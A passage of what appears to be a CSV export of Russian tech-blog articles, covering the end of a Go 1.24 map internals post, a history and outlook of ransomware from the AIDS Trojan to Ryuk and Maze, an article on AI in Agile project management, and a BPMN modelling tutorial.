распределяет нагрузку.Эти методы наряду с другими улучшениями делают map более эффективным и производительным:Улучшенная локальность данных — группировка слотов и контрольные слова сокращают количество кеш-промахов.Быстрый поиск — SIMD-оптимизации позволяют сравнивать сразу 8 кандидатов на соответствие.Гибкое расширение — постепенный рост через split и directory doubling, а также разделение на подтаблицы после 1024 групп снижает накладные расходы на перераспределение.Новая архитектура map в Go 1.24 не только ускоряет поиск и вставку, но и делает структуру более устойчивой к коллизиям и масштабируемой, что критично для современных высоконагруженных систем.Спасибо за внимание!Больше авторских материалов для backend-разработчиков от моих коллег читайте в соцсетях SimbirSoft – ВКонтакте и Telegram."
59,"Криптокошелек или жизнь (данных): Ransomware вчера, сегодня, завтра",DDoS-Guard,Эксперт в сфере защиты от DDoS-атак,0,"Связь и телекоммуникации, Информационная безопасность",2025-04-10,"Программы-вымогатели, шифровальщики, ransomware — одна из самых остроумных, эффективных и злободневных киберугроз нашего времени. Попробуем охватить этот занимательный феномен целиком, от его зарождения до самых ярких проявлений и перспектив на будущее.За 2024 год атаки ransomware в России выросли на 44% по сравнению с 2023 годом. Особенно активными были такие вредоносы как LockBit 3 Black и Mimic, на которые пришлось до 50% всех инцидентов. Растут и суммы выкупа, который жертвы выплачивают злоумышленникам за расшифровку информации — в 2024 году средняя сумма такого платежа составляла 10-15 млн рублей.Не лучше ситуация и за рубежом: по данным BlackFog, 2024 год стал поворотным для программ-вымогателей с годовым ростом в 25%. NCC Group также подтверждает, что в 2024 году наблюдался самый высокий за пять лет объем атак программ-вымогателей. За 10% всех атак отвечали LockBit, более половины всех инцидентов были зарегистрированы в США. Средний размер требования о выкупе в 2024 году, по данным Comparitech,составил более $3,5 млн, при этом подтвержденные выплаты группам программ-вымогателей составили $133,5 млн.Как это работаетВы и так, наверное, знаете, но напомним:Шифровальщик попадает в систему чаще всего через фишинговые письма, реже — через уязвимости в программном обеспечении или скрипты на скомпрометированных сайтах. После активации он быстро сканирует систему, определяя ценные файлы (по расширениям и расположению), и применяет к ним шифрование. Как правило это документы, фотографии, базы данных и другие очевидно значимые для жертвы файлы. Затем на экран выводится заранее созданное авторами вируса сообщение с угрозами и требованием выкупа. Бывают и дополнительные приколы: например Petya переписывал загрузочную область диска, делая работу системы невозможной.Современные вирусы-вымогатели чаще всего используют два самых популярных алгоритма шифрования — AES-256 и RSA-2048, которые практически невозможно взломать без уникального ключа (если только в коде самого шифровальщика нет ошибок и уязвимостей, что, вообще говоря, происходит довольно часто). Означает ли это, что «шеф, все пропало» — и нужно платить выкуп хакерам? Нет, не означает, и позже расскажем почему.Как все началосьВообще история появления ransomware похожа на какой-то довольно мрачный ситком (очень жаль, что по ней до сих пор не сняли кино, могла бы быть ядреная драма типа «Человека дождя»). Первый случай шифрования данных с требованием выкупа относится аж к декабрю 1989 года. Тогда программа, распространяющаяся физически через партию зараженных дискет и названная впоследствии AIDS Trojan, стала массово заражать компьютеры в США и по всему миру. Вирус активировался после 90-й перезагрузки компьютера и шифровал имена файлов в корневом каталоге машины, блокируя доступ к большей части содержимого на жестком диске. Затем программа требовала от жертв отправить деньги (смехотворные по нынешним временам $189) на почтовый ящик в Панаме, чтобы они могли восстановить доступ к заблокированным данным — получив от злоумышленника также физическую дискету с дешифратором.Сообщение программа выводила тоже примечательное, имитирующее просьбу заплатить за лицензионное ПО  То есть, у AIDS уже присутствовали все те признаки ransomware, что нам знакомы сегодня (только криптовалюты, в которой сейчас требуют выкуп шифровальщики, тогда еще не было).Вирус AIDS шифровал данные, используя особую таблицу, которую сохранял на жесткий диск пользователя в открытом виде. Если ее удавалось обнаружить, то можно было провести небыстрое, но успешное обратное шифрование. История широко разошлась в СМИ, начали появляться программы-дешифраторы — среди их авторов был и впоследствии прославившийся Джон Макафи, создатель одного из первых антивирусов McAfee. На этом довольно типичная для таких инцидентов история заканчивается, и при погружении в детали создания первого шифровальщика мы сталкиваемся с какой-то лютой дичью (дальнейшее излагается по «Ransomware Protection Playbook», Roger A. Grimes).Единственная, кажется, существующая фотография создателя ransomware  Создатель вируса AIDS Trojan, 39-летний Джозеф Л. Попп-младший, не был хакером или даже программистом (по крайней мере официально) — он был эволюционным биологом и антропологом, получившим бакалавра зоологии в Университете Огайо и докторскую степень в Гарварде, а затем в течение 15 лет (!) в Африке исследовавшим гамадрилов. В 1978 году он выступил соавтором книги о национальном заповеднике Кении Масай Мара, в 1983-м — опубликовал научную работу о своих исследованиях обезьян. Логически здесь можно провести связь с тем, почему Попп впоследствии переключился на тему СПИДа — ведь считается, что этот вирус возник именно среди африканских приматов, а затем каким-то образом (о деталях не очень хочется думать) передался и человеку.А вот что совершенно невозможно логически понять — каким образом Попп оказался первым в истории создателем и распространителем ransomware, как вообще доктор из Гарварда совершил такой резкий разворот в сторону киберкриминала. Этого мы не знаем до сих пор. Были теории, что Попп затаил злобу на какие-то официальные институции, которые не дали ему желаемую оплачиваемую должность в сфере исследований СПИДа. Были даже теории заговора о том, что его вообще подставили, и ученый не имел никакого отношения к созданию (или даже к распространению) вируса.Так или иначе, события развивались следующим образом (эта информация, судя по всему, взята из материалов судебных слушаний). В какой-то момент в конце 1988 или начале 1989 года, доктор Попп заполучил или приобрел составленный ВОЗ список рассылки (физических адресов, напоминаем, что интернет тогда был еще в младенчестве) участников недавно проведенной в октябре 1988 года в Стокгольме конференции по СПИДу, к которому он добавил списки подписчиков британского компьютерного журнала PC Business World и других деловых журналов. Затем он по-видимому создал (или приобрел и доработал напильником? мы никогда не узнаем) вирус-троян, используя язык программирования QuickBasic 3.0. После этого (очень сложно во все это поверить, а тем более представить) доктор Попп вручную (!) скопировал первый в истории ransomware на 20 тысяч (!!!) заранее приобретенных 5-1/4″ дискет, замаскированных под образовательные материалы про СПИД.И, опять же, вручную, сам оплатив все расходы, разослал их адресатам на все континенты мира.  Многие получатели дискетт Поппа до сих пор хранят их как удивительные артефакты  По степени потраченных усилий и денег (вы просто представьте, сколько стоило 36 лет назад отправить 20 тысяч посылок по всей планете) это предприятие было абсолютным безумием, которое не могла покрыть никакая потенциальная выручка от выплаченных жертвами за расшифровку денег. К каждой из дискет прилагалась инструкция, в которой содержалась маленькая незаметная фраза «если вы используете эту дискету, вам придется заплатить обязательный лицензионный сбор(ы) за программное обеспечение».Когда Поппа арестовали в аэропорту Амстердама (почтовый ящик в Панаме был зарегистрирован на его имя), он пытался доказать в суде, ссылаясь на эту фразу, что не нарушал никаких законов. Стражам правопорядка практически сразу стало понятно, что они имеют дело с сумасшедшим: уже при самой процедуре ареста другой пассажир рейса пожаловался, что Попп нацарапал острым предметом на его чемодане надпись «Внутри этого багажа находится Доктор Попп». В период судебных слушаний доктор эволюционной биологии совершил также немало других примечательных поступков, например, приходил с презервативом, надетым на нос или заплетал бороду в бигуди, чтобы «защититься от излучения». Кажется, никто не знал, что с Поппом делать: его два или три раза (источники за давностью лет разнятся) выпускали и арестовывали снова, катая в самолете туда-сюда между США и Европой. Наконец, в 1991 году создателя ransomware признали невменяемым и выпустили из зала суда.Следующие десять лет Попп провел в тихой безвестности, живя с родителями. История с вирусом AIDS закрыла ему и без того весьма шаткие карьерные перспективы в науке. В 2000 году Попп выпустил (видимо за свой счет, других следов «издательства» Man And Nature не находится) книгу «Популярная эволюция: чему может нас научить антропология».Судя по рецензиям, она содержала множество очень странных тезисов (евгеника круто, эвтаназия круто, домашние животные вредны, а девочки-подростки должны как можно быстрее и больше рожать, ведь в этом единственный смысл жизни) и общих ругательств по поводу того, как устроен мир.  Сейчас, кстати, последнюю копию этой нетленки можно купить на Amazon всего за тысячу долларов без учета доставки.Не особенно любивший людей эксцентричный ученый в последние годы обнаружил слабость к благотворительности и спонсировал (интересно, за счет каких денег?) большую уникальную тропическую оранжерею с экзотическими животными и птицами в Онеонте, штат Нью-Йорк. Вероятно, она напоминала ему о юности в Африке.Joseph L. Popp, Jr. Butterfly Conservatory  Джозеф Попп умер 27 июня 2006 года в возрасте всего 55 лет. Неизвестно, заплатил ли ему в итоге выкуп хотя бы один обладатель зараженного AIDS компьютера. Что было дальше?На удивление следующие 6 лет после инцидента с Поппом никто больше не предпринимал попыток повторить его опыт. В 1995 году, однако, двое ученых-криптографов с рифмующимися фамилиями Юнг и Янг, решили провести эксперимент по созданию самого потенциально разрушительного компьютерного вируса (ох уж эти ученые).Их исследования (и создание тестового вируса для Macintosh) привели к концепции, которая по сей день активно используется не только в преступных, но и ИБ-целях — при создании зловреда применялась криптография с открытым ключом, сам вирус содержал только ключ шифрования (то есть, его буквально нельзя было расшифровать, исходя из кода самого ransomware). Ключ дешифрования злоумышленник высылал только после выплаты выкупа. Интересно, что еще тогда, 30 лет назад, Юнг и Янг предположили, что ransomware ждет большое будущее, и даже спрогнозировали появление «виртуальной неотслеживаемой валюты», в которой будет требоваться и выплачиваться выкуп. На момент исследования научное сообщество отнеслось скептически к предсказаниям Янга и Юнга.Как показали следующие десятилетия, научное сообщество глубоко ошиблось.ЭпидемияВ XXI веке вымогатели развернулись по полной. К 2006 году появилось целое семейство шифровальщиков — Gpcode, TROJ.RANSOM.A, Archiveus, Krotten, Cryzip, MayArchive — которые использовали все более сложные ключи шифрования со все большей длиной.В 2013 году появилась первая суперзвезда мира ransomware, CryptoLocker, который собирал выкупы в криптовалюте. Только за три месяца этого года (с 15 октября по 18 декабря) операторы шифровальщика получили от жертв криптоэквивалент более $27 миллионов. Следующая большая волна (помним, что и предыдущие никуда не уходят, а просто становятся менее распространены и заметны) пришлась на 2017 год, когда пользователей атаковали сразу три новых зловреда, причинивших огромный ущерб — WannaCry от северокорейцев Lazarus (май), Petya (июнь) и Bad Rabbit (октябрь).Где-то с этого момента и следует отсчитывать настоящую эпидемию ransomware. В 2018 году начал действовать суровый шифровальщик Ryuk, который отключал перед началом работы системные процессы и приложения, которые могли бы хоть как-то ему помешать.А еще в том же году произошел еще один важнейший инцидент, который невольно вскрыл совершенно апокалиптическую картину происходящего с шифровальщиками в США.28 ноября 2018 года ФБР официально объявило награду за информацию о двух иранских хакерах, которые создали вирус SamSam, парализовавший работу муниципальных органов и других институтов в СОРОКА ТРЕХ (из 50) штатов США. Цифры были шокирующими: более 230 сетей мэрий, госпиталей, университетов оказались полностью выведены из строя. Убытки были оценены в $30 миллиардов, не говоря уже о том, что сотни тысяч американских граждан лишились доступа к привычным социальным и образовательным услугам или даже медицинской помощи.Выкуп, насколько я помню, иранцам решили из принципа не платить, и маленькие американские городки (а чаще всего SamSam атаковал именно их) на какое-то время откатились в доцифровую эпоху.И если вы думаете, что сейчас ситуация стала лучше, то это не так. Еще в августе 2024 года ФБР выпустило аналогичное заявление, в котором констатировало, что атаки шифровальщиков продолжаются — теперь кроме местных органов власти целями стали секторы образования, финансов, здравоохранения и обороны.Интересно, что для доставки шифровальщиков эта конкретная иранская группировка использовала не традиционный фишинг, а известные уязвимости в оборудовании конкретных производителей (CVE-2024-24919, CVE-2024-3400, CVE-2019-19781, CVE-2023-3519 и CVE-2022-1388).Еще более интересно, что иранские хакеры начали практиковать ransomware-аренду: они находят скомпрометированные устройства в целевых секторах, после чего наводят на них операторов вымогателей (включая NoEscape, Ransomhouse и ALPHV, он же BlackCat) в обмен на процент от выкупа, размер которого хакеры помогают определить.ФБР и CISA, как и практически все ИБ-специалисты, не советуют платить вымогателям выкуп, лучше пытаться справиться с ситуацией своими силами.А почему, кстати?Сообщение о выкупе ransomware Ryuk  Почему не надо платить выкупНу, например, самое банальное: потому что с террористами не надо вести переговоров, и на полученные от вас деньги они будут атаковать других людей и спонсировать, скорее всего, всякие незаконные вещи.Потому что ничто, абсолютно ничто не гарантирует, что ваши данные будут реально восстановлены. Поверить честному слову киберпреступника? А что ему мешает в лучшем случае просто вас проигнорить, получив деньги, а в худшем — потребовать выкуп ВТОРОЙ раз? Да, такое происходит довольно часто, особенно с корпорациями. Первый выкуп требуют за расшифровку важных данных (например, коммерческой тайны), а второй — за то, чтобы их не сливали в даркнет. Опять же, НИЧТО не гарантирует, что данные все равно не будут слиты (и они разумеется будут слиты) даже после двух выплаченных выкупов. Или трех. Или десяти. Что украдено — то пропало, как бы это ни было ужасно, лучше с этим смириться сразу и сэкономить деньги. Хакеры не джентльмены, у них нет никакого благородного кодекса сицилийской мафии, они просто с удовольствием кинут своих жертв еще раз (и еще раз, если потребуется). Более того, некоторые операторы вымогателей настолько циничны (а порой и технически некомпетентны, как с Ryuk, который при дешифровке отсекает у каждого файла последний байт, тем самым их «убивая»), что у шифровальщика нет никакого расшифровщика. Или данные сразу удаляются насовсем (как с атаковавшим сетевые накопители Decryptiomega), после чего требование о выкупе уже заранее является чистым лицемерием. Или, допустим, вредонос продолжает по инерции распространяться годы спустя после прекращения поддержки (тот же самый WannaCry до сих пор весьма активен), соответственно реквизиты для выкупа давно «протухли», и вы заплатите даже не злоумышленникам, а просто кинете деньги в пустоту, что совсем обидно.Операторы Maze сливали украденные данные, даже если им заплатили  Хорошо, не платить выкуп. А что же делать, файлы-то зашифрованы? А они (как всегда) очень нужны, производство стоит, отчеты пропали, сроки горят.Для начала можно подумать (и погуглить). Обратиться к специалисту. Понять, какой вообще шифровальщик вас облагодетельствовал своим присутствием. Шанс, что это будет что-то уникальное и неизвестное в ИБ, достаточно невелик (разве что в начале новых эпидемий). Скорее всего по поразившему вашу систему ransomware уже есть исчерпывающая информация, а может быть даже и готовая программа-дешифратор. Это составляет ощутимый процент случаев, и тогда все закончится более-менее благополучно.Но может и не повезти — расшифровщика нет, что делать — непонятно, а специалисты разводят руками. А данные очень, ОЧЕНЬ нужны. Что делать в таком случае?Тут, конечно, выбор на вашей совести, и все зависит от специфики ситуации. Если реально дешевле и проще заплатить (например, день простоя предприятия стоит как 50 таких выкупов), наверное, вы все равно попробуете этот вариант. Что, напомним, совершенно не означает, что вы получите свои данные обратно — а вот какие-нибудь иранские или северокорейские кибертеррористы станут за ваш счет немножко богаче.Картинка на сайте в даркнете после спецоперации по прекращению деятельности вымогателя Netwalker  Прогнозы на будущееЛюди справляются с шифровальщиками по-разному. Некоторые нанимают хакеров, чтобы те помогли с расшифровкой. Интересно конечно, как это работает, если шифрование асимметричное и в самом зловреде нет багов.Особенно хорошо платят выкупы, если смотреть по статистике, учебные заведения: университет Юты, Мичиганский государственный университет и Калифорнийский университет в Сан-Франциско выплатили операторам NetWalker миллионы долларов. Поэтому атаки на них, как и на малые муниципальные органы, определенно будут продолжаться.Эффективной себя показала прокатившаяся в 2020-2021 годах эпидемия атак шифровальщиков на крупные корпорации и производства: вымогатель Maze всего за несколько месяцев парализовал Garmin, LG, Xerox, Canon, SK Hynix, а также Westech, которая занимается в том числе поставками и обслуживанием критических компонентов американских межконтинентальных баллистических ракет LGM-30G Minuteman III с ядерным зарядом. RagnarLocker в том же 2020-м положил заводы Honda в Японии, Италии, Турции, Великобритании и США. В России в это же время свирепствовал Ryuk, который атаковал ЕВРАЗ, одну из крупнейших металлургических и горнодобывающих компаний в мире. Такие инциденты тоже, несомненно, будут в будущем продолжаться и расширяться.Атаки Ryuk, кстати, приводили порой к любопытным казусам: из зараженной электронной базы американского суда пропали все доказательства, в результате чего развалилось 11 уголовных дел, и шестерых наркоторговцев пришлось отпустить на свободу. Интересно, как подобные кейсы будут решать в будущем: обяжут полицию создавать аналоговые копии всех данных, создадут стратегический резерв средств на выплату выкупа в таких случаях? Общественная осведомленность о шифровальщиках и общественная кампания No More Ransom мало-помалу дают свои плоды — в 2024 году мировая выручка операторов ransomware упала на 30% по сравнению с пятилетней давностью — $813 миллионов против $1,1 миллиарда. Напоминаем, что число самих атак при этом постоянно растет, то есть речь именно об осознанных отказах платить выкуп.Одно из возможных перспективных направлений с технической стороны — вымогатели, которые существуют только в памяти компьютера (не имея физического тела на диске), или даже которые сразу в ней «собираются», используя программные средства ОС (опытные образцы такого рода демонстрировались еще несколько лет назад). Есть и другие уникумы: «Лаборатория Касперского» сообщала, к примеру, что шифровальщик Sodin, чтобы обойти антивирусные решения, использует уникальную тактику «Небесные врата» (Heaven’s Gate), которая абьюзит легитимные функции процессора и позволяет выполнять 64-разрядный код в 32-разрядном адресном пространстве процесса.Бороться с такими вирусами будет намного труднее. Точные цифры заражения шифровальщиками неизвестны и наверняка в несколько раз превышают известную статистику, так как в большинстве случаев компании предпочитают разбираться с проблемой самостоятельно. Масштабы можно оценить как колоссальные: ФСБ заявляла, что в 2024 году около 70% всех обращений в Национальный координационный центр по компьютерным инцидентам (НКЦКИ) были связаны с уничтожением данных, в том числе вирусами-вымогателями. Специфических способов превентивной борьбы с ransomware, к сожалению, нет — кроме соблюдения информационной гигиены и азов кибербезопасности. Поэтому образовывайтесь сами, образовывайте сотрудников, не платите выкуп киберпреступникам, и будьте счастливы."
60,Искусственный интеллект в Agile,Сбер,"Технологии, меняющие мир",0,"Программное обеспечение, Мобильные технологии, Веб-сервисы",2025-04-10,"ИИ повышает эффективность Agile за счёт автоматизации задач, улучшения решений и оптимизации рабочих процессов. По прогнозам Gartner, в скором времени ИИ заменит 80 % ручного труда в управлении проектами, а это означает, что команды Agile смогут быстрее выявлять закономерности, прогнозировать проблемы и вносить коррективы в проекты.Ключевые принципы гибких подходов и влияние ИИAgile основан на ключевых принципах: итеративность, гибкость и обратная связь с клиентами.Итеративность. Agile‑проекты разбиваются на короткие циклы, называемые спринтами (чаще всего 1–4 недели). Искусственный интеллект обрабатывает данные предыдущих спринтов, оценивает ожидаемое время выполнения задач и помогает точнее планировать следующий спринт. Он отслеживает прогресс в реальном времени, что позволяет оперативно корректировать планы и процессы.Гибкость. Искусственный интеллект использует накопленные данные, для прогнозирования будущих событий. Он оценивает, сколько времени было потрачено на задачи, как эффективно использовались ресурсы (люди, материалы, бюджет) и какие возникали риски (задержки, проблемы с оборудованием, изменения требований). На основе этого анализа создаёт прогнозы, которые показывают вероятность успешного завершения проекта и этапы с высоким риском задержек или перерасхода ресурсов. Также он предлагает, как оптимально распределить ресурсы. Это помогает создавать более реалистичные планы проекта.Обратная связь. ИИ анализирует отзывы из разных источников (социальные сети, опросы, прямая связь), помогая быстро и точно определить сильные и слабые стороны проекта, а также улучшить продукт или сервис.ИИ при планировании спринта Планирование спринта — ключевой этап в Agile. Команды часто полагаются на прошлый опыт и догадки, что может приводить к ошибкам и срыву сроков. Искусственный интеллект помогает сделать этот процесс более точным.Анализ исторических данныхИИ применяет алгоритмы машинного обучения (например, регрессионный анализ и нейронные сети) для глубокого анализа данных предыдущих проектов, накопленных в системах управления задачами, таких как Jira, Asana, Trello и аналогичных. Он анализирует корреляции между различными факторами (размер команды, бюджет, сложность проекта) и результатами (своевременное завершение, соблюдение бюджета и т. д.). Искусственный интеллект находит скрытые закономерности, которые могут остаться незамеченными людьми. Например, может показать, что некоторые задачи всегда занимают больше времени или что некоторые специалисты справляются с определенными заданиями лучше других.Прогнозная оценка задачИИ использует имеющиеся данные для прогнозирования будущих событий. Он анализирует время, затраченное на выполнение задач, эффективность использования ресурсов (людей, материалов, бюджета) и риски (задержки, проблемы с оборудованием, изменения требований). На основе анализа данных строит прогнозные модели, которые показывают вероятность успешного завершения проекта, этапы с высоким риском задержек или перерасхода ресурсов, а также предлагает оптимальное распределение ресурсов. Это помогает команде составлять более реалистичный план проекта.Распределение задач между сотрудникамиИИ применяет машинное обучение для оценки производительности членов команды. Он собирает данные из систем управления задачами, отчётов о проделанной работе и систем учета рабочего времени. Учитываются также отпуска, больничные и другие факторы. Алгоритмы анализируют связи между типом задачи, временем выполнения и результатами. Например, ИИ может определить, что один сотрудник быстро решает проблемы с базами данных, а другой — с дизайном. На основе этих данных он предлагает оптимальное распределение задач с учетом специализации и текущей загруженности сотрудников.Автоматизация рутинных задач с помощью ИИИскусственный интеллект анализирует информацию о выполненных задачах, текущем состоянии проекта, сравнивает запланированные результаты и полученные в ходе работы, автоматически формирует отчёты. Быстро обрабатывает огромные массивы информации, избавляя сотрудников от утомительной монотонной работы.Например, в CRM‑системах ИИ автоматически отмечает, на каком этапе находится каждая задача (например, «выполняется» или «завершена»). Создаёт отчёты о ходе работы, чтобы руководители могли видеть, что происходит.Допустим менеджер завершает переговоры с клиентом и вводит результаты в систему. ИИ автоматически обновляет статус сделки, создаёт отчёт и уведомляет сотрудников о дальнейших действиях. Алгоритмы ИИ сегментируют клиентов на группы по разным признакам (возраст, пол, что покупают, что любят), чтобы запускать воронки продаж, создавать целевую рекламу и предложения. Помогает обрабатывать запросы от клиентов и отправлять им нужные уведомления.Чат-боты и виртуальные помощникиЧат‑боты могут интегрироваться с системами управления проектами и выступать в качестве централизованного хаба для управления задачами.Сотрудники могут создавать, редактировать и отслеживать задачи непосредственно через чат‑бота, используя естественный язык. Например, можно написать: «Создать задачу: разработка дизайна логотипа; исполнитель: Анна Петрова; дедлайн: 15 ноября; приоритет: высокий». Бот автоматически создаст задачу в системе управления проектами, присвоив ей соответствующие атрибуты: приоритет, метки и назначенного исполнителя. В случае некорректного ввода, например, несуществующего сотрудника, бот запросит уточнения.Чат‑бот предоставляет команде актуальную информацию о ходе проекта в режиме реального времени. Он визуализирует данные в понятном формате (например, диаграммы Ганта, спринт‑борды), выявляет задержки и оповещает о потенциальных проблемах. Например, бот может автоматически уведомить руководителя проекта и исполнителя о критическом отставании задачи от графика, предлагая возможные решения.Виртуальный помощник отправляет своевременные напоминания о сроках выполнения задач, встречах и других важных событиях, сводя к минимуму риск пропусков и задержек. Настройки уведомлений могут быть персонализированы для каждого пользователя.Чат‑бот предоставляет быстрый доступ к базе знаний (FAQ) и может отвечать на часто задаваемые вопросы о проекте, процессах и правилах компании. Бот автоматизирует сбор обратной связи от членов команды и клиентов с помощью опросов, анкетирования и сбора текстовых отзывов. Инструменты обработки естественного языка (NLP) помогают анализировать полученные данные, выявлять тенденции и ключевые моменты, предоставляя команде информацию для улучшения проекта. Результаты анализа могут быть в виде отчётов и визуализированных данных.KPI для Agile-проектов с использованием ИИЧтобы оценить эффективность использования ИИ в Agile‑управлении, нужно отслеживать изменения в ключевых показателях эффективности самого проекта и работы команды. Ниже примеры возможных KPI.Скорость — количество завершенных пользовательских историй (или других единиц работы) за спринт. Этот показатель отражает темп работы команды.Процент задач, выполненных в срок — доля задач, выполненных в рамках спринта и в запланированные сроки.Качество выполнения работы‑ количество ошибок, обнаруженных после завершения задач, или уровень соответствия результата установленным требованиям. Время цикла — время, затраченное на выполнение одной задачи от начала до конца. Возврат инвестиций (ROI) от внедрения ИИ — показывает экономию времени, ресурсов и денег благодаря использованию ИИ. Удовлетворённость клиентов — оценивается с помощью индекса потребительской лояльности (NPS), индекса удовлетворённости клиентов (CSAT) и других показателей, отражающих восприятие продукта или сервиса пользователями.Выбор KPI должен основываться на целях и задачах проекта, а также на используемых инструментах и технологиях. Проблемы и соображенияХотя преимущества интеграции ИИ в гибкое управление проектами значительны, однако ИИ — это не панацея, а всего лишь инструмент, который помогает упростить работу. И его эффективность зависит от правильного применения и понимания ограничений.Качество и полнота данных. Точность прогнозов и аналитики зависит от качества и полноты исторических данных, на которых обучаются ИИ модели. Неполные или неправильные данные приведут к неточным прогнозам и ошибочным результатам.Обобщаемость. Модели ИИ, обученные на конкретных типах проектов или в определенных контекстах, могут плохо справляться с другими проектами, которые отличаются по характеру, сложности или технологиям. Человеческий опыт. ИИ — ценный помощник, но не замена опытным специалистам. Для интерпретации результатов и принятия обоснованных решений нужны знания, интуиция и критическое мышление человека. Решения должны основываться не только на автоматизированном анализе, но и на экспертном понимании контекста и рисков."
61,BPMN на практике: примеры и ошибки,OTUS,Цифровые навыки от ведущих экспертов,0,"Консалтинг и поддержка, Рекрутинг и HR, Производство мультимедиа-контента",2025-04-10,"О нотации BPMN написано немало публикаций. В них разбираются различные объекты этой нотации и способы их взаимодействия. Поэтому в этой статье мы не будем говорить об основах BPMN, а вместо этого разберем различные случаи правильного и не очень построения диаграмм.Для начала рассмотрим несколько вариантов реализации примера с зависимыми экземплярами.Кредитная проверкаРассмотрим простой пример. Допустим у нас имеется банковское приложение, в котором необходимо выполнить кредитную проверку клиента. К примеру, мы хотим убедиться, что у клиента, запрашивающего новый кредит нет непогашенных кредитных обязательств. При этом, нам нужно, чтобы при выполнении одной кредитной проверки клиента, у нас одновременно не выполнялась еще одна проверка того же клиента. Причина может заключаться в том, что общее количество выполненных кредитных проверок влияет на результат проверки.Предположим, что мы выполняем проверку кредитоспособности клиента и в это же время получаем второй запрос на того же клиента. Логичным решением является проверка наличия совпадающих экземпляров на уровне данных перед началом фактической проверки кредитоспособности. В первом примере мы воспользуемся сигнальным событием проверки наличия запущенных событий для одного клиента. Сигнальное событие — это самый простой и компактный способ моделирования взаимодействия между различными экземплярами.Проблема сигнала в том, что он работает как широковещательный и не обращается к какому‑либо конкретному экземпляру. Поэтому, строго говоря, клиент игнорируется, а все ожидающие экземпляры его ловят. Поэтому данная диаграмма будет не совсем точно отображать необходимый нам процесс проверки кредитоспособности клиента.Давайте немного усложним нашу диаграмму. У нас по прежнему будет присутствовать сигнальное событие, но нам необходимо будет также определить получателя (один экземпляр) сообщения. В результате, нам придется вызвать второй запрос данных перед завершением экземпляра. Однако это правильный способ решения проблемы, возникающей при использовании сигнального события.Рассмотрим еще один вариант реализации, в котором нам не нужно никакого взаимодействия между экземплярами. Экземпляр сам периодически проверяет, может ли он перейти к проверке кредитоспособности. Недостатком данного варианта является то, что это может привести к задержкам и накладным расходам из‑за использования цикла.Таким образом, мы можем реализовать процесс проверки кредитоспособности тремя различными способами, при этом каждый из них имеет свои достоинства и недостатки.Создание счетаДопустим, мы хотим смоделировать процесс в BPMN, и этот процесс вызывает некоторые бизнес‑правила. Здесь, в качестве примера рассмотрим создание счета. Для того чтобы создать счет, необходимо рассчитать скидку. Сумма заказа и тип клиента являются соответствующими критериями для расчета скидки.При моделировании мы будем фокусироваться на потоке процесса, и в данном примере процесс состоит из двух этапов: расчета скидки и создания счета. При этом, скидка рассчитывается до создания счета. В результате получается очень простой процесс.Моделировать сам расчет скидки в BPMN‑модели (то есть подробно расписывать содержимое элемента Rule Engine) не имеет смысла. Для дерева решений правил при каждом дополнительном критерии будет существенно увеличиваться сложность. При этом, расчет скидки не относится к функциональности приложения. Это бизнес правило и его не нужно отображать в BPMN‑модели.Поэтому представленная ниже схема является неверной с точки зрения BPMN, так как содержит ненужную информацию по работе бизнес правил.Поэтому имеет смысл разделить процессные и бизнес‑правила и отображать на диаграмме только то, что связано с работой процессов.Неправильная структураРассмотри еще одну распространенную проблему, связанную со структурированием диаграмм BPMN. Допустим, есть адвокат, который предлагает юридические консультации своим клиентам. Услуга работает следующим образом: клиенты могут обратиться за юридической помощью, когда им это необходимо. Юрист предоставляет требуемую консультацию и заносит оплачиваемые часы в табель учета рабочего времени клиента. По окончании месяца бухгалтер юриста определяет количество оплачиваемых часов на основании табеля учета рабочего времени и выставляет счет‑фактуру.Это достаточно распространенный сценарий моделирования и здесь сложность представляют не этапы процессов, а структура диаграммы.Процесс «Предоставление юридических консультаций (provide legal advice)» выполняется много раз в месяц. Процесс Monthly Invoicing выполняется только один раз в месяц. Поэтому эти два процесса должны быть смоделированы как отдельные пулы.Конечно, эти два пула не являются полностью независимыми друг от друга. Они работают с одними и теми же данными — табелем учета рабочего времени клиента (Customer Time Sheet). Наши возможности по моделированию такой связи между данными в BPMN очень ограничены. Это связано с тем, что BPMN ориентирован на поток управления, а не на поток данных.Однако мы можем использовать элемент хранилища данных, чтобы смоделировать эту связь на уровне данных, что и продемонстрировано на диаграмме.Рассмотри неправильный вариант реализации данного процесса. В этом примере оба процесса смешаны в один. Как видите здесь всего один пул в который помещены все процессы. В лучшем случае это очень неявный способ моделирования. Это означает, что за каждую предоставленную юридическую консультацию по окончании месяца высылается счет‑фактура. В большинстве случаев такой способ моделирования неверен, так как у нас предполагается выставление единого счета фактуры за все консультации в конце месяца, а не отдельные счета за каждую консультацию.Один к NПосмотрим еще один пример сценария моделирования. Единственный экземпляр процесса (например Импорт заказов) приводит к появлению множества отдельных экземпляров другого процесса (например ERP‑системы). Типичными конструкциями являются мультиэкземпляры или циклы, запускающие другие процессы с помощью сообщений (потоки сообщений). Например, вот такие:Использование подобной конструкции имеет смысл, если Process Engine использует службу determine assignee для назначения новой задачи.Другой вариант реализации подобной задачи предполагает, что мы используем механизм правил на шаге determine assignee также для назначения новой задачи.И третий вариант, при котором наш Process Engine сам определяет нового получателя, например, с помощью заданного выражения. Как видно, в таком случае диаграмма существенно упрощается.ЗаключениеМы рассмотрели несколько простых процессов и их представления в виде диаграмм BPMN. При этом некоторые из представленных вариантов были не совсем корректными или попросту ошибочными. Таким образом мы наглядно продемонстрировали ситуации, когда диаграмма содержит избыточную информацию, как в случае с подсчетом скидки, а когда она будет полностью неправильной, как в случае с выставлением счетов в конце месяца.На основании представленных примеров можно сделать выводы о том, как можно правильно использовать компоненты BPMN для построения диаграмм, корректно отображающих процессы.Если вам нужно быстро освоить BPMN или углубить понимание принципов моделирования, рекомендую посетить два практических урока в Otus. Разберете ключевые моменты и подходы, которые пригодятся при проектировании бизнес-процессов:14 апреля. Соглашение о моделировании в BPMN22 апреля. Быстрый старт в моделировании BPMN"
